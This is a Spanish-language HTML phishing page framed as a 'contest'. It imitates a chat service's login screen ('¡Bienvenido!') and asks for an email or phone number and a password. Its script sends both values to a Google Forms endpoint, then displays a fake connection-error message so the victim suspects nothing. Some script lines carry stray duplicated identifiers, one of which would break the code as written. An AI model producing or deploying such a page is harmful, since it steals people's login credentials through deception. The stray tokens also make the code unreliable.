<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Concurso</title>
    <style>
        body {
            background-color: #4a57a8;
            color: white;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            background-color: #2c3e50;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            width: 300px;
        }
        .container h1 {
            margin-bottom: 20px;
        }
        .container input {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
        }
        .container button {
            width: 100%;
            padding: 10px;
            background-color: #3498db;
            border: none;
            border-radius: 5px;
            color: white;
            font-size: 16px;
        }
        .container button:hover {
            background-color: #2980b9;
        }
        .container .error {
            color: red;
            margin-top: 20px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>¡Bienvenido!</h1>
        <p>Estamos muy emocionados de verte de nuevo!</p>
        <form id="loginForm">
            <input type="text" id="email" placeholder="CORREO ELECTRÓNICO O NÚMERO DE TELÉFONO" required>
            <input type="password" id="password" placeholder="CONTRASEÑA" required>
            <button type="submit">Iniciar Sesión</button>
        </form>
        <div class="error" id="error" style="display: none;">
            Ha ocurrido un error. Por favor, comprueba tu conexión a Internet o intenta nuevamente más tarde.
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault();
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const formID = '13rraD0OE4VhooljQYPsZzLvqD7fhP_EhYqK7xcsECG4'; 13rraD0OE4VhooljQYPsZzLvqD7fhP_EhYqK7xcsECG4

            const formData = new FormData();
            formData.append('entry.743140809', email); 743140809
            formData.append('entry.1460238454', password); 1460238454

            fetch(`https://docs.google.com/forms/d/e/${formID}/formResponse`, {
                method: 'POST',
                body: formData
            })
            .then(response => {
                document.getElementById('error').style.display = 'block';
            })
            .catch(error => {
                document.getElementById('error').style.display = 'block';
            });
        });
    </script>
</body>
</html>
